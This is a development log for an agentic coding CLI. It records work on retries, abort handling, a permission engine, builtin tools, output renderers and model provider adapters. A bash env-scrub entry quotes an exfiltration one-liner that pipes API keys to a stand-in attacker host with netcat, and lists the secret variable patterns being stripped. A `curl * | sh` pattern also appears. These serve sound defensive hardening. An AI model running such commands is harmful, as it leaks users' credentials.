- `src/harness/loop.ts` — wall-clock cap is now enforced *during* a step. `AbortSignal.any([callerSignal, wallClockController.signal])` composes the user's signal with a `setTimeout(..., maxWallClockMs)` controller. A hung provider/tool gets the abort signal mid-execution; provider and tools already honor the signal.
- `src/harness/loop.ts` — the partial tool_results message persisted on `maxToolErrors` bail is now also pushed to the in-memory `messages` array, keeping the two views in sync. Footgun for any future code that reads `messages` post-bail (resume/replay).
- `src/harness/retry.ts` — new `generateWithRetry(provider, req, opts)` wraps `provider.generate()` per CONTRACTS.md §4. Retries on 429 / 5xx / network errors with exponential backoff (200/800/3200 ms by default, 3 attempts). Refuses to retry once any event has yielded — replaying mid-stream would emit duplicates. `isRetryableError` duck-types `e.status` and `e.code` instead of importing every SDK's error class. The harness's `collectStep` call goes through this.
- `src/tools/builtin/bash.ts` — env scrub before spawn. Strips `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_PASS`, `AWS_*`, `OPENAI_*`, `ANTHROPIC_*`, `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `GITHUB_TOKEN`/`GH_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD`. Closes the obvious `bash("env | grep KEY | nc attacker")` exfil path; not a substitute for the M2 sandbox.
- `src/cli/output/{plain,json}.ts` — renderers now accept injectable `out`/`err` sinks so they can be unit-tested without spawning subprocesses or hijacking `process.stdout/stderr`. Plain renderer also gains `maxArgsChars` (default 200) so `tool_invoking` doesn't dump 10KB of `write_file` content into the terminal. Added `provider_event` → `error` → stderr path that the original renderer silently dropped.
- `src/cli/run.ts` — `RunOptions.rendererOverride` and `RunOptions.errSink` test seams so end-to-end runs can be exercised without polluting process streams.

**New tests:**
- `tests/storage/json-safe.test.ts` — 1 test asserting tampered `messages.content` surfaces as `StorageJsonError` with the right context string.
- `tests/permissions/symlink.test.ts` — 4 tests: symlink-on-file escape rejected, symlink-on-directory escape rejected, plain path still matches, write-new-file still matches via parent realpath.
- `tests/harness/retry.test.ts` — 13 tests: `isRetryableError` matrix (429/5xx/4xx/network codes/non-Error), happy passthrough, retry-and-succeed, no-retry-after-yield, no-retry on non-retryable, exhaustion throws last error, custom sleep schedule pins backoff.
- `tests/cli/output-plain.test.ts` — 14 tests: every event type's stdout/stderr split, args truncation, color on/off ANSI presence, deny/confirm formatting, allow silent, flush trailing newline.
- `tests/cli/output-json.test.ts` — 3 tests: NDJSON shape, provider_event roundtrip, flush no-op.
- `tests/cli/run.test.ts` — 8 tests: `exitCodeFor` matrix, end-to-end with mock provider for happy/exhausted/aborted/bootstrap-failure, renderer.flush invocation.
- `tests/tools/bash.test.ts` — added 1 test asserting `ANTHROPIC_API_KEY`, `MY_TOKEN`, `AWS_SECRET_ACCESS_KEY` are scrubbed from subprocess env while non-sensitive vars pass through.
- Total suite: **334 pass / 6 skip / 714 expect() calls** in ~1.6s. +49 tests over Step 6.

**Code-review fixes folded in before commit:**
- **Abort during provider stream now returns `interrupted/aborted` (or `interrupted/maxWallClockMs`) instead of `error/providerError`.** When the SDK throws on signal abort mid-call, the harness's `collectStep` catch now checks `signal.aborted` first and routes to the matching ExitReason. User Ctrl+C while a provider hangs gets a clean exit code 130 instead of the misleading exit code 1 with "harness: aborted" detail. Regression test pins it.
- **New `'internalError'` exit reason** for uncaught throws in the harness path (typically SQLite errors). Was reusing `'providerError'`, which mislabeled DB errors as provider failures in the audit trail. Both still map to `error` status / exit 1; the difference is just diagnostic clarity.

**Decisions:**
- **Retry only before yield.** Retrying mid-stream would replay the partial output and produce duplicates. The common failure mode (429/connect refused) happens before any event is emitted; that's the case we cover.
- **Retry detection is duck-typed** (`e.status`, `e.code`) not type-checked against SDK error classes. Each provider SDK has its own error hierarchy; importing all of them would couple `retry.ts` to every adapter.
- **Realpath fallback chain** for non-existent targets: try the path itself, then `realpath(parent) + basename`. Keeps `write_file` working on new files while still catching symlinked parent dirs (the realistic escape).
- **Wall-clock combined via `AbortSignal.any`** rather than a separate periodic check. Composing signals propagates to provider/tool naturally — they already honor the signal — so no second abort plumbing is needed.
- **Env scrub by name pattern** rather than allowlist. Allowlist breaks every script that needs its specific env vars; deny-by-name catches the leak shape without breaking common tooling.
- **Renderer sinks are functions, not streams.** `(s: string) => void` is trivial to test; passing a `WritableStream` would require Bun's stream API in tests. The function shape also lets us collect strings into arrays for assertions.
- **`StorageJsonError` is a typed class** rather than a string match in messages. Lets future code differentiate corruption from logic errors.
- **`bash` env scrub list intentionally over-broad.** Catches false positives (a legit `BUILD_TOKEN` in CI) but the failure mode is "subprocess can't see the var" which is debuggable; the alternative (under-scrub) is silent credential leakage.

**Out of scope (still M2+):**
- Sandbox proper (bwrap / sandbox-exec)
- Trust prompt for new directories
- Hierarchy enterprise→user→project→session permission merging
- Cost tracking via provider token usage
- Hooks (PreToolUse, PostToolUse)
- Resume / replay / session picker
- Real network integration tests for retry (requires evals harness)
- Concurrent SQLite access stress tests (M2 with subagents)
- DB file mode 0600 (cosmetic; doc gap)

**Pending:** none.

**Next:** M2 plan. Top candidates from the spec, ranked by likely pain when actually using the CLI: cost tracking + telemetry, compaction, resume from session id, plan mode, sandbox, doctor command.

---

## [2026-04-27] M1 / Step 6 — One-shot CLI + harness lifecycle events (closes M1)

**Done:**
- `src/harness/types.ts` — `HarnessEvent` union (`session_start`, `step_start`, `provider_event`, `tool_invoking`, `tool_decided`, `tool_finished`, `session_finished`) + `onEvent` callback on `HarnessConfig`.
- `src/harness/collect.ts` — `collectStep` now accepts an `onEvent` forwarder so each provider stream event surfaces in real time. Renderer throws are swallowed.
- `src/harness/loop.ts` — emits the lifecycle events around each step, around each tool invocation, and around the session itself. `safeEmit` helper makes the integration crash-proof.
- `src/harness/invoke-tool.ts` — `InvokeToolResult` now carries the `Decision | null` so the loop can fire `tool_decided` events for renderers (null when the tool wasn't found, since no decision happened).
- `src/cli/args.ts` — hand-rolled parser. Flags: `--version`/`-v`, `--help`/`-h`, `--json`, `--model <id>`, `--max-steps <n>`. Unknown flag → reject with diagnostic. Anything not a flag is collected as the prompt (joined by spaces).
- `src/cli/bootstrap.ts` — `bootstrap(input)` builds a `HarnessConfig` from cwd + env. Default model is `anthropic/claude-sonnet-4-6`. Loads `./.agent/permissions.yaml` if present (returns `policySource: 'project'`), otherwise falls back to `defaultPolicy()` (strict + empty rules — refuses everything until explicitly configured). Migrates the DB. Registers the 6 builtin tools. Exposes `providerOverride` and `dbPath` test seams.
- `src/cli/output/{types,plain,json}.ts` — `OutputRenderer` interface, plus two implementations:
  - `plain.ts` for TTY/pipe output: assistant text streams to stdout, tool indicators and lifecycle markers go to stderr (so a piped stdout stays a clean transcript). ANSI colors only when stderr is a TTY and `NO_COLOR` is unset.
  - `json.ts` for `--json`: NDJSON lines to stdout, one per `HarnessEvent`. Spec §2.2: in `--json`, stdout is NDJSON only.
- `src/cli/signal.ts` — `installSignalHandler` wires SIGINT to an `AbortController`. First Ctrl+C requests graceful abort; second forces `process.exit(130)`.
- `src/cli/run.ts` — orchestrator. Picks renderer, builds bootstrap input from args, installs signal handler, calls `runAgent`, maps the `HarnessResult` to a process exit code per spec §2.2 (0 done · 1 error · 2 exhausted · 130 interrupted).
- `src/cli/index.ts` — full rewrite. Was a stub that exited 1; now dispatches to `run` after parsing args, with `--version`/`--help` short-circuits and a `missing prompt` error path.
- `tests/cli/args.test.ts` — **15 cases** covering each flag, value parsing, rejection of unknown flags / non-numeric `--max-steps` / missing `--model` value, mixed-flag prompts, empty argv.
- `tests/cli/bootstrap.test.ts` — **7 cases** with isolated tmpdirs and a mock provider: default model, model override, unknown-model rejection, project policy loading, default-policy fallback, budget forwarding, DB migration.
- `tests/harness/events.test.ts` — **6 cases** for the `onEvent` contract: bracketing events, `step_start` per iteration, `provider_event` forwarding, full `tool_invoking → tool_decided → tool_finished` sequence, `tool_decided` skipped for unknown tools (no decision was made), throwing renderer doesn't derail the loop.
- `tests/cli.test.ts` updated for the new entry: `--help` exit 0 with usage, missing prompt exits 1 with usage, unknown flag rejected, unknown model from bootstrap surfaces in stderr.
- Total suite: **289 pass / 6 skip / 617 expect() calls** in ~1.6s.

**Code-review fixes folded in before commit:**
- **`bootstrap` no longer leaks the DB on throw.** Reordered to load policy and resolve the provider *before* opening SQLite, since those steps can throw on malformed YAML or unknown model. `migrate` (the only remaining throw-source after the DB opens) is wrapped in try/catch that closes the DB on throw. Two regression tests assert the DB file isn't even created when bootstrap aborts.
- **`src/cli/index.ts` now catches stray throws from `main()`.** Top-level `await main()` was unwrapped — any sync throw from `parseArgs` or stdout/stderr writes would surface as Bun's default unhandled-rejection trace instead of a "forja: ..." diagnostic.
- **`--max-steps` rejects decimals, hex, scientific notation, and leading zeros.** Was: `Number.parseInt('3.5', 10)` returned `3` and silently passed validation. Now: regex `^[1-9][0-9]*$` validates the literal before parsing. Three regression tests pin the behavior.
- **Dead code removed from `args.ts`.** `FLAGS_REQUIRING_VALUE` was declared and consulted in the default branch, but the flags it listed were already intercepted by their explicit `case`s — the check could never fire. Default branch simplified to rejecting any `--`-prefixed token outright.

**Decisions:**
- **No Ink in M1.** The roadmap mentioned "Ink mínimo" but plain text + ANSI delivers a working one-shot CLI today. Ink belongs with the *interactive* TUI (input editor, slash commands, ongoing conversation) which is M2 territory. Adding React + Ink for one-shot streaming would be ~300 lines of components for output that ANSI does in 80 lines. Documented as deliberate deferral.
- **Hand-rolled arg parser.** The flag set is small (5 flags) and stable. Adding `commander` or `yargs` would be more surface area than the parser itself. ~80 lines.
- **`OutputRenderer` interface** sits between the harness and the actual renderer. Plain + JSON ship now; an `InkRenderer` can drop in next without touching the harness or the CLI dispatch.
- **Stdout vs stderr split:** assistant text → stdout (clean transcript when piped); everything else (tool indicators, lifecycle markers, summary) → stderr. Aligns with spec §2.2 ("stdout puro, stderr pra log") and lets `agent "summarize X" > out.md` work intuitively.
- **Color detection looks at `stderr.isTTY`**, not stdout. Tool indicators live on stderr; if it's piped, ANSI would corrupt the log. `NO_COLOR` env var disables colors regardless.
- **Default policy is strict + empty.** First-time users hit a deny on every tool, which forces them to opt in via `.agent/permissions.yaml`. Surprising at first but the right default for a tool that runs `bash`. Documented in usage.
- **`onEvent` is synchronous.** Async would let renderers do work before the loop continues but adds complexity (await per event) and doesn't help the current renderers. Sync + crash-proof (try/catch around each call) is the right trade for M1.
- **`tool_decided` is skipped for unknown tools.** No decision happened; emitting an event would imply one. Renderers can rely on the invariant: if `tool_decided` fires, there's a real `Decision`.
- **DB closes on every CLI exit path** — `try/finally` in `run.ts`. SQLite WAL leaves dangling files if not closed cleanly.
- **Exit 130 for both abort and SIGINT.** Unix convention for "terminated by signal 2 (INT)". Even though the wall-clock cap also returns `interrupted`, that's fine — exit 130 means "didn't run to completion", not specifically "user pressed C".

**Out of scope:**
- Ink components and interactive TUI — M2
- Slash commands (`/help`, `/cost`, `/model`, `/clear`) — M3
- Resume / `--resume <id>` — M2
- Plan mode (`--plan`) — M2
- Replay (`--replay <id>`) — M2
- Cost display (no token extraction yet) — M2
- `--list-tools`, `--list-sessions`, `agent doctor` — M2
- Capability detection beyond TTY/NO_COLOR (truecolor, locale, image protocol) — M2
- `agent` with no prompt as REPL — M2
- Hierarchy resolution for permissions (enterprise → user → project) — M2

**Pending:** none for this step. **M1 closes here.**

**Next:** M2. Plenty of options (compaction, telemetry/cost, plan mode, resume, sandbox, doctor, more eval coverage). Decide priority once we run the CLI against real models for a while and see what hurts.

---

## [2026-04-27] M1 / Step 5 — Agent Harness (autonomous loop)

**Done:**
- `src/harness/types.ts` — `RunBudget` (`maxSteps`, `maxWallClockMs`, `maxToolErrors`, `maxRepeatedToolHash`, `maxOutputTokensPerCall`), `DEFAULT_BUDGET`, `ExitReason` enum (`done`/`maxSteps`/`maxWallClockMs`/`maxToolErrors`/`degenerateLoop`/`aborted`/`providerError`/`scriptExhausted`), `HarnessConfig`, `HarnessResult`.
- `src/harness/collect.ts` — `collectStep(events)` drains a provider stream into `{message_id, text, tool_uses, thinking, stop_reason, errors}`. Tool names from `tool_use_start` are tracked by id and reattached on `_stop` (canonical event has only the id at stop time). Orphan stops become `harness.orphan_tool_use_stop` errors instead of crashes.
- `src/harness/invoke-tool.ts` — single-tool pipeline. Lookup → persist `tool_calls` row → engine.check → record approval → start/finish with the right status. `confirm` decisions become `confirm_no` denials in M1 (no UI yet); the original prompt is surfaced to the model in the tool_result. Tool exceptions never propagate; they're wrapped as `tool.exception` errors.
- `src/harness/loop.ts` — `runAgent(config)` autonomous loop. Builds the running message list, calls provider, builds assistant content blocks (text first, then tool_uses) for both DB persistence and the next request, drives every tool through `invokeTool`, accumulates tool_results into the next user message. Snapshots `messages` on each request so post-call mutations don't retroactively change what the provider observed. Sliding-window degenerate-loop detector (sha256 of `name:stableJson(args)`, window 5, threshold from `budget.maxRepeatedToolHash`).
- `src/harness/index.ts` — public surface.
- `tests/harness/collect.test.ts` — **8 tests**: text-only, single tool_use lifecycle, parallel tool_uses tracked by id, text+tool_use coexistence, thinking_delta, error events captured, orphan-stop defensive path, default stop_reason.
- `tests/harness/invoke-tool.test.ts` — **6 tests**: happy path with approval row + tool_call lifecycle, unknown tool (no DB rows), policy deny, M1 confirm-becomes-denied with prompt surfaced, tool returning ToolError, tool throwing → `tool.exception`.
- `tests/harness/loop.test.ts` — **10 tests** with a scripted mock provider: text-only one-step done, tool→result→done two-step (with assertion that the second request observes the tool_result message), maxSteps cap, pre-aborted signal, unknown tool (loop continues), policy deny (loop continues), maxToolErrors cap, degenerateLoop detection (identical args), session/messages persisted to SQLite, provider crash → providerError with detail.
- Total suite: **254 pass / 6 skip / 529 expect() calls** in ~670ms.

**Code-review fixes folded in before commit:**
- **Gemini integration unblocked.** The harness emits user messages with `tool_result` blocks; the Gemini adapter rejected them because Gemini correlates by function name, not id. Now `ProviderToolResultBlock` carries an optional `name`, the harness populates it from `input.toolName` on every result (success and error paths), and the Gemini adapter converts to `functionResponse` instead of throwing. Anthropic and OpenAI ignore the field. Two new tests pin the contract: Gemini conversion with `name` works; the missing-`name` case still throws (for catching harness bugs).
- **Empty error messages no longer get lost.** `(e as Error).message ?? String(e)` returned `""` when an `Error` had an empty message (nullish coalescing only catches null/undefined). Replaced with `e.message || e.name || String(e)` — falls through to the constructor name and finally `toString` so we never report `tool crashed: ` with no body. Same fix in the harness `providerError` path.

**Decisions:**
- **`maxCostUsd` deferred to M2.** Stream events don't expose token usage in M1 (the normalizer drops `message_delta.usage`); cost tracking lives with telemetry.
- **`confirm` → `confirm_no` in M1**, with the prompt text mirrored into the tool_result so the model sees *why* it was denied. Step 6 (TUI) replaces this branch with a real prompt and decides `confirm_yes`/`confirm_no` based on user input.
- **No checkpoint creation in this step.** The plan listed "checkpoints básicos" but the table doesn't exist yet; adding a stub now would be dead code. Migration 003 + git-stash integration land in M3 with the rest of the rollback subsystem.
- **`messages` array is cloned per request** (`{...messages}`). The previous version passed a shared reference; mutations during the next iteration would have changed what the provider observed (caught by a test asserting the second request sees the tool_result message as the last entry).
- **Hash window is in-memory.** Spec §13 has `tool_calls.input_hash` for SQL-side analysis; the harness's degenerate-loop detection uses an in-process sliding window keyed on `sha256(name + stableJson(args))`. SQL-side detection is M2.
- **All registered tools are sent to the provider.** No filtering by playbook/role yet — the harness exposes the full registry. Filtering is a Step 6 / playbooks (M3) concern.
- **Aborted signal is checked before each step AND between tool invocations within a step.** A multi-tool step honors abort mid-execution rather than waiting for the next iteration.
- **`scriptExhausted` exit reason** is reserved for the mock provider draining (test-only path); production providers never hit it.

**Out of scope:**
- Streaming UI — the harness collects whole steps before persisting (Step 6 will tee events to UI)
- Compaction — full message history sent every turn (M2)
- Checkpoints — `tool.metadata.writes` flag is read but no snapshot is taken (M3)
- Hooks (PreToolUse, PostToolUse, Stop, etc.) — M4
- Subagents (`task_*`) — M3
- Resume from DB — current loop only runs forward from a fresh user prompt (M2)
- Cost tracking — needs token usage extraction in stream normalizer (M2)
- Provider retry/backoff on 5xx — would wrap provider.generate; harness in M2

**Pending:** none for this step.

**Next:** Step 6 — Ink TUI mínimo + one-shot mode wiring. Connect the CLI entry (`src/cli/index.ts` is still a stub) to `runAgent` with a real Anthropic provider, render streaming output and tool calls in the terminal, wire `Ctrl+C` to the AbortSignal. Closes M1.

---

## [2026-04-27] M1 / Step 4 — Permission Engine + Tool System + 6 builtin tools

**Done:**
- `src/storage/migrations/002-approvals.ts` — adds the `approvals` table per AGENTIC_CLI §13 (FK cascades from `tool_calls`, CHECK constraints on `decision` and `decided_by`, index on `tool_call_id`).
- `src/storage/repos/approvals.ts` — `recordApproval`, `listApprovalsByToolCall`. Exported through `src/storage/index.ts`.
- `src/permissions/types.ts` — `Policy`, `PolicyMode` (`strict` | `acceptEdits` | `bypass`), `PolicyCategory` (`fs.read` | `fs.write` | `bash` | `web.fetch` | `misc`), `Decision` (allow / deny / confirm), per-tool rule shapes (`BashPolicy`, `PathPolicy`, `FetchPolicy`), `PermissionsView`.
- `src/permissions/matcher.ts` — `matchPath` (Bun.Glob, cwd-anchored so `**/foo` can't reach `/etc/passwd`), `matchCommand` and `matchHost` (custom glob→regex compiler so `*` matches across `/` and spaces), plus `firstMatching*` helpers for diagnostics.
- `src/permissions/engine.ts` — `createPermissionEngine(policy, opts)` returns `check(toolName, category, args) → Decision`. Order: deny rules first (always win), then allow, then confirm; default = deny. `bypass` short-circuits to allow. `acceptEdits` upgrades unmatched writes from deny to confirm (not auto-allow — see Decisions).
- `src/permissions/config.ts` — `parsePolicy`, `loadPolicyFromString`, `loadPolicyFromFile`, `defaultPolicy`. Strict validator: rejects mistyped keys (`allow_path` instead of `allow_paths` is the bug class), rejects malformed mode values, rejects non-mapping top-level.
- `src/permissions/index.ts` — public surface.
- `src/tools/types.ts` — `Tool<I, O>`, `ToolContext` (signal + cwd + sessionId + stepId + permissions per CONTRACTS §2), `ToolResult<O> = O | ToolError`, `isToolError` discriminator, `toolError` constructor, `ERROR_CODES` enum.
- `src/tools/registry.ts` — `createToolRegistry`.
- `src/tools/builtin/{read-file,write-file,edit-file,glob,grep,bash}.ts` — six tools, all returning `ToolResult` (no thrown errors).
- `src/tools/builtin/index.ts` — `BUILTIN_TOOLS` array + `registerBuiltinTools(reg)` helper.
- `src/tools/index.ts` — public surface.
- `.github/workflows/ci.yml` — adds `apt install ripgrep` step so the grep tool's tests run instead of skipping.
- New dep: `yaml@latest` (parser).
- New tests:
  - `tests/storage/approvals.test.ts` — 6 cases: roundtrip, ordering, FK cascade, CHECK rejections, FK rejection on unknown tool_call_id.
  - `tests/permissions/matcher.test.ts` — 18 cases covering path resolution (relative, absolute, outside-cwd), command matching (exact, prefix, wildcard with spaces and slashes), host matching (case, glob), `firstMatching*` helpers.
  - `tests/permissions/engine.test.ts` — 17 cases: bash allow/deny/confirm, path allow/deny/confirm, mode behaviors (strict/acceptEdits/bypass), web.fetch hosts, misc category, missing-arg rejections.
  - `tests/permissions/config.test.ts` — 10 cases: full policy parse, mode default, malformed-key rejection, YAML syntax errors, default policy.
  - `tests/tools/registry.test.ts` — 4 cases.
  - `tests/tools/_helpers.ts` — shared `makeCtx()` for tool tests.
  - `tests/tools/{read-file,write-file,edit-file,glob,bash}.test.ts` — 5 happy-path + error-path + abort-signal coverage per tool.
  - `tests/tools/grep.test.ts` — 6 cases gated on `rg` availability via `describe.if(RG_AVAILABLE)` (skips locally if ripgrep missing; CI installs it).
- Existing `tests/storage/migrate.test.ts` updated to assert ≥ 2 migrations (was hardcoded to 1).
- Total suite: **228 pass / 6 skip / 446 expect() calls** in ~600ms.

**Code-review fixes folded in before commit:**
- **`acceptEdits` mode now matches spec §8 semantics.** Was: `confirm_paths` still required confirmation AND unmatched writes escalated to confirm. Now: `confirm_paths` for writes auto-allows (skip confirmation step — the actual convenience the mode promises); unmatched writes default-deny (mode is convenience, not bypass); reads keep the same confirm behavior. Deny still wins over confirm in all modes.
- **`PermissionsView.hasPathRule` removed.** It was hardcoded to look up `write_file`/`read_file` rules, ignoring per-tool overrides on `edit_file`/`glob`/etc. — wrong by construction, with no caller. The harness in Step 5 will call `engine.check(toolName, ...)` directly with the right tool name. The view now exposes only `mode`.
- **`parsePolicy` rejects top-level arrays.** Previously slipped through the `typeof === 'object'` check.
- **`bash` wraps `SIGTERM` in try/catch** (was already wrapped on the SIGKILL escalation). The proc can exit on its own between the timer firing and `proc.kill()` running — kill on a dead pid throws ESRCH; we swallow it now.
- **`edit_file` rejects empty `old_string` explicitly** (`edit.old_string_empty`) with a hint pointing to `write_file`. Previously fell through to `old_string_not_found`, which was less diagnostic.

**Decisions:**
- **`Tool.execute` returns `O | ToolError` instead of throwing** (CONTRACTS §2, cláusula 7). Errors are *data*. Tests use `isToolError(out)` discriminator instead of try/catch. The harness in Step 5 catches stray throws and converts them, but builtins don't throw.
- **Custom glob→regex compiler for commands and hosts** instead of `Bun.Glob`. Bun's `*` doesn't cross `/` (correct for paths, wrong for `curl * | sh` where the URL contains `/`). The compiler escapes regex metachars and translates `*`→`.*`, `?`→`.`. The "no regex in policy" rule (CLAUDE.md) is preserved — the user still authors with glob syntax; regex is an internal implementation detail.
- **`acceptEdits` mode upgrades unmatched writes from deny to confirm**, not to auto-allow. The mode is opt-in convenience for refactor sessions, not a free-for-all. Auto-allow lives in `bypass` (which requires an explicit dangerous flag, deferred).
- **Permission categories instead of per-tool rules everywhere.** New tools join an existing category instead of needing a new policy section. The YAML still supports per-tool overrides (`tools.bash`, `tools.write_file`).
- **Path matcher is cwd-anchored.** A pattern like `src/**` resolves against cwd before matching, and an absolute target outside the cwd subtree falls back to direct absolute match. Result: bare `**/foo` can't reach `/etc/passwd` — security property by construction.
- **Strict validator rejects unknown shapes** (e.g., `allow_path` typo'd as singular). Silently ignoring unrecognized keys is how YAML-driven policies turn into "allow-everything" in production.
- **`bash` is `writes: true` pessimistically** (per CONTRACTS §2.6.3). The `read_only` flag in the input schema is a hint *from the caller*, not the tool — Step 5 harness can use it to route through a different policy path.
- **`grep` shells out to `rg`** instead of pure-TS implementation. Performance + battle-tested feature set. Tests skip cleanly if `rg` is missing; CI installs it.
- **Hierarchy resolution is project-only in M1** — no enterprise/user/project/session merging yet. Spec §8 requires it; landing in M2 with the trust subsystem.
- **`yaml` over `js-yaml`** — newer API surface, comparable battle-testing, smaller install footprint.

**Out of scope:**
- Sandbox (`bwrap` / `sandbox-exec`) — M2
- Checkpoint creation before writes — Step 5 / M3
- Hook integration (PreToolUse / PostToolUse) — M4
- Hierarchy enterprise → user → project → session — M2
- Output sanitization (CSI escape stripping) — M2
- The other 15 tools in CONTRACTS §2.6 (background, task_*, memory_*, fetch_url, code retrieval) — later steps/milestones
- Confirmation UI — Step 6 (Ink); engine returns `Decision` shape ready for the UI to consume
- Real-API/network tests for grep — would need fixtures; current coverage is enough for the wrapper

**Pending:** none for this step.

**Next:** Step 5 — Agent Harness loop (autonomous profile) per AGENTIC_CLI §5. Ties storage + provider + permissions + tools together: session lifecycle, message loop with budget, tool invocation pipeline (engine.check → record approval → execute → persist), abort/cancel, basic checkpoint stub.

---

## [2026-04-27] M1 / Step 3.6 — OpenAI (GPT) adapter

**Done:**
- Added `openai@6.34.0` dependency.
- `src/providers/openai/capabilities.ts` — capabilities for `gpt-4o` and `gpt-4o-mini`. Cache mode declared as `client_only` (OpenAI's prefix-cache is automatic and probabilistic — there is no server-side cache the adapter can target the way Anthropic does).
- `src/providers/openai/stream.ts` — `normalizeOpenAIStream` converts Chat Completions chunks into the canonical `StreamEvent` taxonomy. Handles: id from first chunk (synth fallback), text deltas, refusal field (emitted as text_delta), tool_call accumulation per `index` (id and name may straggle, args streamed across deltas), per-tool finalization at end-of-stream (OpenAI has no per-tool stop event), finish_reason mapping, malformed JSON args drop with error event.
- `src/providers/openai/index.ts` — `createOpenAIProvider(modelName, opts)`. Reads API key from `opts.apiKey` or `OPENAI_API_KEY`; supports `baseURL` for OpenAI-compatible endpoints (Azure OpenAI, OpenRouter). Test seam via `opts.client`. Message conversion is the most complex of the three adapters: a single `ProviderMessage` may produce multiple OpenAI messages (assistant text + tool_calls coalesce; tool_result blocks split into separate `role: 'tool'` messages). System prompt prepended as the first message.
- `src/providers/openai/register.ts` — `registerOpenAIModels(reg)`.
- `createDefaultRegistry` got a one-line addition: `registerOpenAIModels(reg)`. No other registry-side changes — the extensibility refactor from Step 3.5 paid off as designed.
- `tests/providers/openai-stream.test.ts` — **13 tests** covering text-only, tool_call lifecycle (incl. straggling id/name), parallel tool_calls finalized in index order, synthesized id, id-overrides-synth, real-id-not-overwritten regression, refusal as text_delta, content+refusal in the same chunk, finish_reason mapping (6 cases), null doesn't clobber, malformed args, empty stream.
- `tests/providers/openai.test.ts` — **17 tests** covering model rejection, env key, capabilities, generateConstrained stub, generate end-to-end, system prepending, config forwarding (`stream: true` enforced), assistant tool_use coalescing, user tool_result splitting into tool-role messages, mixed tool_results+text ordering regression, tool_result-on-assistant throw, tool_use-on-non-assistant throw, countTokens heuristic (chars/4) on text and on tool blocks.
- `tests/providers/registry.test.ts` updated — asserts OpenAI lineup, total count = sum of all three families, OpenAI factory parity test.
- Total suite now **140 tests / 289 expect() calls** in ~285ms.

**Code-review fixes folded in before commit:**
- `ToolCallInProgress` carries an explicit `idIsSynthesized: boolean` flag instead of relying on the `startsWith('call_')` heuristic. Real OpenAI ids start with `call_` too, so the prefix couldn't tell synth from real — a real id arriving in chunk 1 could (in theory) be silently overwritten by a later chunk. The flag flips false the first time a real id is set and stays there.
- `toOpenAIMessages` now emits `tool_result` messages **before** the user text message when both are present in the same `ProviderMessage`. Reversing the order would make the model see a new user prompt before the tool results it requested in the prior assistant turn.
- Throws on `tool_result` blocks in non-user messages, symmetric to the existing throw for `tool_use` blocks in non-assistant messages. Catches malformed callers at the boundary instead of forwarding nonsense to the API.

**Decisions:**
- **`countTokens` is a chars/4 heuristic**, not a real tokenizer call. OpenAI exposes no server-side `countTokens` endpoint (unlike Anthropic and Google) — proper local impl needs `tiktoken`. The heuristic is within ~10% for English, good enough for budget early-warnings. Replaced with tiktoken when M5 wires the local tokenizer. Documented in code.
- **`delta.refusal` becomes `text_delta`**, not a dedicated event kind. OpenAI's safety refusals are user-visible prose; treating them as text matches what reaches the UI. The accompanying `finish_reason` is `'stop'`, not `'content_filter'`, so no special stop reason needed.
- **`baseURL` is exposed in options** to support Azure OpenAI / OpenRouter / Together / Groq / etc. Same SDK shape; just a different host.
- **Tool args stream across chunks** like Anthropic (unlike Gemini). Tracking is keyed by `tool_calls[].index` (stable across chunks, unlike `id` which arrives only once). Edge cases covered: id arriving in a later chunk, name in a different chunk than the index registration, multiple parallel tool_calls finalized in index order at end-of-stream.
- **`ProviderMessage` → multiple `OpenAIMessage`**: a `user` message containing tool_result blocks can't fit OpenAI's schema (which requires `role: 'tool'` for results), so we split. Documented inline; tests pin the contract.
- **Step 3.5's extensibility refactor paid off**: adding GPT was 4 new files in `src/providers/openai/` + 1 line in `createDefaultRegistry`. No edits to shared types, no edits to `registry.ts`'s `ModelEntry`, no changes to other adapters. This is the regression-bar for "easy to add new providers".
- **Model lineup intentionally narrow** (`gpt-4o` + `gpt-4o-mini`) — matches PROVIDERS.md §2's table. Newer models (gpt-5, o-series reasoning) added when their quirks (no system prompt, hidden reasoning tokens) are characterized — that's its own design exercise.

**Out of scope:**
- Real network coverage (deferred to evals)
- `tiktoken`-based token counting (M5)
- Reasoning models (o1/o3/etc) — different shape, deferred
- Structured outputs via `response_format: json_schema` (deferred until `generateConstrained` ships)
- Azure-specific auth (uses `apiKey` + `baseURL` pattern; full Azure AD OAuth deferred)

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`). Now with three providers behind the same `Provider` interface, the harness in Step 5 has real choice.

---

## [2026-04-27] M1 / Step 3.5 — Gemini adapter + extensibility refactor of the registry

**Done:**
- Added `@google/genai@1.50.1` dependency.
- `src/providers/google/capabilities.ts` — capabilities for `gemini-2.5-pro`, `gemini-2.5-flash`, `gemini-2.5-flash-lite`. Cache mode is `server_persistent` (Gemini context caching is durable, not 5min like Anthropic). Cost numbers are illustrative (PROVIDERS.md §5 said "to document when adapter is implemented" — covered with placeholder values consistent with the rest of the registry).
- `src/providers/google/stream.ts` — `normalizeGoogleStream` converts Gemini chunks into the canonical `StreamEvent` taxonomy. Handles: synth `start` on first chunk (Gemini has no `message_start` frame), text deltas, function calls (single complete part per chunk → emit start+delta+stop back-to-back), `thought`/`thinkingText` parts, finishReason mapping (STOP/MAX_TOKENS/TOOL_CALLS/FUNCTION_CALL/SAFETY/RECITATION/BLOCKLIST/PROHIBITED_CONTENT/SPII), null finishReason guard, empty stream fallback.
- `src/providers/google/index.ts` — `createGoogleProvider(modelName, opts)` factory. Reads API key from `opts.apiKey`, `GOOGLE_API_KEY`, or `GEMINI_API_KEY`. Test seam via `opts.client`. Message conversion: `'assistant'`→`'model'`, content string→`parts:[{text}]`, content blocks→parts, `tool_use`→`functionCall`. `tool_result` blocks **throw** with a clear message (Gemini correlates by name not id; the harness will own id↔name resolution in Step 5+). Tool defs convert to Gemini's `functionDeclarations` shape.
- `src/providers/google/register.ts` — `registerGoogleModels(reg)`.
- `src/providers/anthropic/register.ts` — same pattern, extracted from registry.ts.

**Registry refactor (extensibility):**
- `ModelEntry.factory` is now `(opts?: unknown) => Provider` at the registry boundary. The previous `CreateProviderOptions = CreateAnthropicProviderOptions` alias is gone — registry no longer needs to know every family's option shape. Each adapter narrows internally with a structural cast.
- `createDefaultRegistry()` is now a 3-line orchestrator: `createRegistry()`, `registerAnthropicModels(reg)`, `registerGoogleModels(reg)`. Adding GPT later is one new `registerOpenAIModels` import + one call.
